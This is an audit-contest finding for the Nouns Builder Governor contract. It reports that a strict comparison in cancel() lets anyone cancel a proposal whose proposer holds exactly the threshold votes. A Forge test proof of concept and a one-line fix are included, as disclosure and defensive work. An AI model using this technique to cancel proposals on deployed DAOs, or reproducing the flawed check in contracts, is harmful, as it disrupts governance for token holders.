## Tags

- bug
- 2 (Med Risk)
- sponsor confirmed

# [A proposal can be cancelled by anyone if the proposal has exactly proposalThreshold votes](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/194) 

# Lines of code

https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L128
https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L363


# Vulnerability details

## Impact
If the proposer of a proposal has votes in the same amount as the proposalThreshold, they can create a proposal. But in this case, anyone can also cancel this proposal.

When creating a proposal the requirement is "Ensure the caller's voting weight is greater than or equal to the threshold".
When cancelling a proposal the check is:
if `getVotes(proposal.proposer, block.timestamp - 1) > proposal.proposalThreshold` then it the cancelling is not allowed. In effect, if the number of votes is lower than *or equal* to the proposalThreshold it can be cancelled.

In the extreme case where all the DAO members have no more than the proposalThreshold amount of votes, every proposal can be cancelled.

## Proof of Concept
The forge test below demonstrates the issue:

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "forge-std/console.sol";
import { NounsBuilderTest } from "../utils/NounsBuilderTest.sol";

import { IManager } from "../../src/manager/IManager.sol";
import { IGovernor } from "../../src/governance/governor/IGovernor.sol";
import { GovernorTypesV1 } from "../../src/governance/governor/types/GovernorTypesV1.sol";

contract GovCancelWrongCheckTest is NounsBuilderTest, GovernorTypesV1 {
    uint256 internal constant AGAINST = 0;
    uint256 internal constant FOR = 1;
    uint256 internal constant ABSTAIN = 2;
    uint256 proposalThresholdBps = 100;

    address internal voter1 = address(0x1234);
    address internal randomUser = address(0x8888);

    function setUp() public virtual override {
        super.setUp();

        deployMock();
    }

    function testCanCancelProposalIfExactThreshold() public {
        // mint a few tokens
        for (uint256 i; i < 85; i++) {
            vm.prank(address(auction));
            token.mint();
        }
        assertEq(token.totalSupply(), 100);

        // transfer one token to voter1
        vm.prank(address(auction));
        token.transferFrom(address(auction), voter1, 5);
        assertEq(token.balanceOf(voter1), 1);

        // make sure voter has enough votes
        assertEq(governor.proposalThreshold(), 1);
        assertEq(token.getVotes(voter1), 1);

        vm.warp(block.timestamp + 1);

        // propose
        (address[] memory targets, uint256[] memory values, bytes[] memory calldatas) = mockProposal();
        vm.prank(voter1);
        bytes32 proposalId = governor.propose(targets, values, calldatas, "test");

        // Proposal created successfully
        assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Pending));

        // Cancel proposal
        vm.prank(randomUser);
        governor.cancel(proposalId);
        assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Canceled));
    }

    function setMockGovParams() internal virtual override {
        setGovParams(2 days, 1 seconds, 1 weeks, proposalThresholdBps, 1000);
    }

    function mockProposal()
        internal
        view
        returns (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory calldatas
        )
    {
        targets = new address[](1);
        values = new uint256[](1);
        calldatas = new bytes[](1);

        targets[0] = address(auction);
        calldatas[0] = abi.encodeWithSignature("pause()");
    }
}
```

## Tools Used
Manual review

## Recommended Mitigation Steps
Change the check in `cancel` to match the requirement in `propose`;
change line 363 in Governor.sol to:
`if (msg.sender != proposal.proposer && getVotes(proposal.proposer, block.timestamp - 1) >= proposal.proposalThreshold)`
